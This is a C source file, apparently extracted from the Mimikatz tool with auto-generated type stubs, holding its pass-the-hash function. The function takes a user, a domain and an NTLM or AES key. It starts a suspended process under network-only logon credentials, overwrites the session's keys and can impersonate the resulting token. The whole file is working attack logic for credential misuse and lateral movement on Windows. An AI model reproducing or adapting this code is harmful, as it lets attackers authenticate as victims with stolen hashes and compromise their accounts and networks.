#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_11__   TYPE_4__ ;
typedef  struct TYPE_10__   TYPE_3__ ;
typedef  struct TYPE_9__   TYPE_2__ ;
typedef  struct TYPE_8__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int /*<<< orphan*/  tokenStats ;
struct TYPE_11__ {int /*<<< orphan*/  hProcess; int /*<<< orphan*/  hThread; int /*<<< orphan*/  dwThreadId; int /*<<< orphan*/  dwProcessId; } ;
struct TYPE_10__ {scalar_t__ isReplaceOk; int /*<<< orphan*/ * Aes256Key; int /*<<< orphan*/ * Aes128Key; int /*<<< orphan*/ * NtlmHash; int /*<<< orphan*/  member_4; int /*<<< orphan*/ * member_3; int /*<<< orphan*/ * member_2; int /*<<< orphan*/ * member_1; TYPE_1__* member_0; } ;
struct TYPE_8__ {int /*<<< orphan*/  LowPart; scalar_t__ HighPart; } ;
struct TYPE_9__ {TYPE_1__ AuthenticationId; } ;
typedef  TYPE_2__ TOKEN_STATISTICS ;
typedef  TYPE_3__ SEKURLSA_PTH_DATA ;
typedef  TYPE_4__ PROCESS_INFORMATION ;
typedef  int /*<<< orphan*/ * PCWCHAR ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  int /*<<< orphan*/  BYTE ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int AES_128_KEY_LENGTH ; 
 int AES_256_KEY_LENGTH ; 
 int /*<<< orphan*/  CREATE_SUSPENDED ; 
 int /*<<< orphan*/  CloseHandle (int /*<<< orphan*/ ) ; 
 scalar_t__ DuplicateTokenEx (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FALSE ; 
 scalar_t__ GetTokenInformation (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_2__*,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  KULL_M_PROCESS_CREATE_LOGON ; 
 scalar_t__ KULL_M_WIN_MIN_BUILD_7 ; 
 int LM_NTLM_HASH_LENGTH ; 
 int /*<<< orphan*/  LOGON_NETCREDENTIALS_ONLY ; 
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ; 
 int /*<<< orphan*/  NtResumeProcess (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  NtTerminateProcess (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ OpenProcessToken (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  PRINT_ERROR (char*) ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int /*<<< orphan*/  STATUS_FATAL_APP_EXIT ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  SecurityDelegation ; 
 scalar_t__ SetThreadToken (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int TOKEN_DUPLICATE ; 
 int TOKEN_IMPERSONATE ; 
 int TOKEN_QUERY ; 
 int TOKEN_READ ; 
 int /*<<< orphan*/  TokenImpersonation ; 
 int /*<<< orphan*/  TokenStatistics ; 
 char* _wpgmptr ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_sekurlsa_pth_luid (TYPE_3__*) ; 
 scalar_t__ kull_m_process_create (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,char*,TYPE_4__*,int /*<<< orphan*/ ) ; 
 scalar_t__ kull_m_string_args_byName (int,int /*<<< orphan*/ **,char*,int /*<<< orphan*/ **,char*) ; 
 scalar_t__ kull_m_string_stringToHex (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  kull_m_string_wprintf_hex (int /*<<< orphan*/ *,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  wcstoul (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	TOKEN_STATISTICS tokenStats;
	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256, szLuid = NULL;
	DWORD dwNeededSize;
	HANDLE hToken, hNewToken;
	PROCESS_INFORMATION processInfos;
	BOOL isImpersonate;

	if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, NULL))
	{
		tokenStats.AuthenticationId.HighPart = 0; // because I never saw it != 0
		tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, NULL, 0);
	}
	else
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
			{
				isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
#pragma warning(push)
#pragma warning(disable:4996)
				kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
#pragma warning(pop)
				kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");

			}
			else PRINT_ERROR(L"Missing argument : domain\n");
		}
		else PRINT_ERROR(L"Missing argument : user\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
	{
		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
			{
				data.Aes128Key = aes128key;
				kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
			}
			else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
		}
		else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
	{
		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
			{
				data.Aes256Key = aes256key;
				kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
			}
			else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
		}
		else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
	{
		if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
		{
			data.NtlmHash = ntlm;
			kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		}
		else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
	}

	if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
	{
		if(szLuid)
		{
			kprintf(L"mode\t: replacing NTLM/RC4 key in a session\n");
			kuhl_m_sekurlsa_pth_luid(&data);
		}
		else if(szUser)
		{
			if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
			{
				kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
				if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
				{
					if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
					{
						kuhl_m_sekurlsa_pth_luid(&data);
						if(data.isReplaceOk)
						{
							if(isImpersonate)
							{
								if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
								{
									if(SetThreadToken(NULL, hNewToken))
										kprintf(L"** Token Impersonation **\n");
									else PRINT_ERROR_AUTO(L"SetThreadToken");
									CloseHandle(hNewToken);
								}
								else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
								NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
							}
							else NtResumeProcess(processInfos.hProcess);
						}
						else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
					}
					else PRINT_ERROR_AUTO(L"GetTokenInformation");
					CloseHandle(hToken);
				}
				else PRINT_ERROR_AUTO(L"OpenProcessToken");
				CloseHandle(processInfos.hThread);
				CloseHandle(processInfos.hProcess);
			}
			else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
		}
		else PRINT_ERROR(L"Bas user or LUID\n");
	}
	else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");

	return STATUS_SUCCESS;
}